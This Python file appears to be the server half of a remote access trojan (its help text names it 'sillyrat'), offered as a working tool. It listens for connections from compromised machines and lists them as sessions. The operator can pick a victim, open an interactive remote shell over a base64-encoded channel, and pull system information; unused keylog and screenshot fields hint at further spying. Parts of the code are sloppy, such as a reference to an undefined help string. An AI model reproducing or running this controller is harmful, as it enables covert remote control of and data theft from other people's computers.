import base64
import socket
import threading
import subprocess
import argparse
import tabulate
import os,sys


__LOGO__ = """
%s v1.0 @mik/server
"""
os.system('cls')
os.system('cat logo.txt')

__HELP_OVERALL__ = """usage: python3 server.py command [--help] [--option OPTION]

These are the commands available for usage:

    bind        Run the Server on machine and establish connections

You can further get help on available commands by supplying
'--help' argument. For example: 'python3 sillyrat generate --help'
will print help manual for generate commmand
"""

__HELP_BIND__   = """usage: python3 server.py bind [--address ADDRESS] [--port PORT]

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind

The Bind command is used to bind the application on server
for incoming connections and control the clients through
the command interface
"""


class PULL:
    
    WHITE = '\033[1m\033[0m'
    PURPLE = '\033[1m\033[95m'
    CYAN = '\033[1m\033[96m'
    DARKCYAN = '\033[1m\033[36m'
    BLUE = '\033[1m\033[94m'
    GREEN = '\033[1m\033[92m'
    YELLOW = '\033[1m\033[93m'
    RED = '\033[1m\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    LINEUP = '\033[F'

    def __init__(self):
        if not self.support_colors:
            self.win_colors()



    def support_colors(self):
        plat = sys.platform
        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
														'ANSICON' in os.environ)
        is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
        if not supported_platform or not is_a_tty:
            return False
        return True

    def win_colors(self):
        self.WHITE = ''
        self.PURPLE = ''
        self.CYAN = ''
        self.DARKCYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.BOLD = ''
        self.UNDERLINE = ''
        self.END = ''

    def get_com(self, mss=()):
        if mss:
            rtval = input(self.DARKCYAN + "root@mik" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
        else:
            rtval = input(self.DARKCYAN + "root@mik" + self.END + " ")
        rtval = rtval.rstrip(" ").lstrip(" ")
        return rtval

    def print(self, mess):
        print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)

    def function(self, mess):
        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)

    def error(self, mess):
        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)

    def exit(self, mess=""):
        sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)

    def logo(self):
        print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)

    def help_c_current(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('shell'  , 'Launch a New Terminal/Shell.'),
            ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
            ('exit', 'Exit from server!')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_general(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('exit', 'Exit from server')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_sessions(self):
        sys.stdout.write("\n")
        print("Info       : Display connected sessions to the server!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sessions")
        sys.stdout.write("\n")

    def help_c_connect(self):
        sys.stdout.write("\n")
        print("Info       : Connect to an available session!")
        print("Arguments  : Session ID")
        print("Example    : \n")
        print("$ connect 56\n")
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('ID', 'integer', 'ID of the sessions from the list')
        ]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_disconnect(self):
        sys.stdout.write("\n")
        print("Info       : Disconnect current session!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ disconnect")
        sys.stdout.write("\n")

    def help_c_clear(self):
        sys.stdout.write("\n")
        print("Info       : Clear screen!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ clear")
        sys.stdout.write("\n")

    def help_c_shell(self):
        sys.stdout.write("\n")
        print("Info       : Launch a shell against client!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ shell")
        sys.stdout.write("\n")
        
    def help_c_sysinfo(self):
        sys.stdout.write("\n")
        print("Info       : Gathers system information!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sysinfo")
        sys.stdout.write("\n")

    def help_overall(self):
        global __HELP_OVERALL__
        print(__HELP_OVERALL__)
        sys.exit(0)

    def help_bind(self):
        global __HELP_BIND__
        print(__HELP_BIND__)
        sys.exit(0)

    def help_generate(self):
        global __HELP_GENERATE__
        print(__HELP_GENERATE__)
        sys.exit(0)

pull = PULL()

class CLIENT:

    STATUS = "Active"
    MESSAGE = ""
    KEY     = ")J@NcRfU"

    def __init__(self, sock, addr):
        self.sock    = sock
        self.ip      = addr[0]
        self.port    = addr[1]

    def acceptor(self):
        data = ""
        chunk = ""

        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                self.STATUS = "Disconnected"
                break
            data += chunk.decode('utf-8')
            if self.KEY.encode('utf-8') in chunk:
                try:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
                except UnicodeDecodeError:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
                if not self.MESSAGE:
                    self.MESSAGE = " "
                data = ""

    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True
        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))

    def recv_data(self):
        while not self.MESSAGE:
            try:
                pass
            except KeyboardInterrupt:
                break
        rtval = self.MESSAGE
        self.MESSAGE = ""
        return rtval

class COMMCENTER:

    CLIENTS = []
    COUNTER = 0
    CURRENT = ()    #### Current Target Client ####
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                pull.help_c_sessions()
            elif vals[1] == "connect":
                pull.help_c_connect()
            elif vals[1] == "disconnect":
                pull.help_c_disconnect()
            elif vals[1] == "clear":
                pull.help_c_clear()
            elif vals[1] == "shell":
                pull.help_c_shell()
            elif vals[1] == "sysinfo":
                pull.help_c_sysinfo()
        else:
            if self.CURRENT:
                pull.help_c_current()
            else:
                pull.help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_ping(self, _id):
        return

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt
            else:
                sys.stdout.write("\n")
                pull.error("No client is associated with that ID!")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax!")
            sys.stdout.write("\n")

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_shell(self):
        result = ""
        if self.CURRENT:
            sys.stdout.write("\n")
            while True:
                val = input("# ")
                val = "shell:" + val.rstrip(" ").lstrip(" ")

                if val:
                    if val != "shell:exit":
                        self.CURRENT[1].send_data(val)
                        result = self.CURRENT[1].recv_data()
                        if result.strip(" "):
                          print(result)
                    else:
                        break
        else:
            sys.stdout.write("\n")
            pull.error("You need to connect before execute this command!")
            sys.stdout.write("\n")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)
            
    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
            pull.error("You need to connect before execute this command!")




    def c_exit(self):
     sys.stdout.write("\n")
     pull.exit("See Ya!\n")


class INTERFACE(COMMCENTER):

    SOCKET  = None
    RUNNER  = True

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port
        self.CURRENT = None  # Certifique-se de definir este atributo, se ainda não estiver definido
        self.screenshot_list = []  # Adicione esta linha para definir o atributo



    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            pull.print("Successfuly Bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            pull.exit("Unable to bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )


    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    #### Commands ####

    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                self.c_exit()
            elif vals[0] == "help":
                self.c_help(vals)
            elif vals[0] == "sessions":
                self.c_sessions()
            elif vals[0] == "ping":
                self.c_ping(vals)
            elif vals[0] == "connect":
                self.c_connect(vals)
            elif vals[0] == "disconnect":
                self.c_disconnect()
            elif vals[0] == "shell":
                self.c_shell()
            elif vals[0] == "clear":
                self.c_clear()
            elif vals[0] == "sysinfo":
                self.c_sysinfo()

    def launch(self):
        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")

        while True:
            val = pull.get_com(self.CURRENT)
            self.execute(val.split(" "))

    def close(self):
        self.SOCKET.close()


class PARSER:

    COMMANDS = ['bind']

    def __init__(self, prs):
        self.mode    = self.v_mode(prs.mode, prs.help)
        self.help    = self.v_help(prs.help)

        if self.mode == "bind":
            self.address = self.v_address(prs.address)
            self.port    = self.v_port(prs.port)

    def v_help(self, hl):
        if hl:
            if not self.mode:
                pull.help_overall()
            else:
                if self.mode == "bind":
                    pull.help_bind()
                else:
                    pull.help_help()

    def v_address(self, str):
        return str

    def v_port(self, port):
        if not port:
            pull.exit("You need to Supply a Valid Port Number")

        if port <= 0 or port > 65535:
            pull.exit("Invalid Port Number")

        return port

    def v_mode(self, val, hl):
        if val:
            if val in self.COMMANDS:
                return val
            else:
                pull.exit("No such command found in database")
        else:
            if not hl:
                pull.exit("Invalid Syntax. Refer to the manual!")

def main():
    pull.logo()

    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument('mode', nargs="?", help="Moder")
    parser.add_argument('-h', '--help'   , dest="help"   , default=False, action="store_true", help="Help Manual")
    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
    parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
    parser = parser.parse_args()

    parser = PARSER(parser)

    if parser.mode == "bind":
        iface = INTERFACE(parser)
        iface.bind()
        iface.accept()
        iface.launch()
        iface.close()

if __name__ == "__main__":
    main()
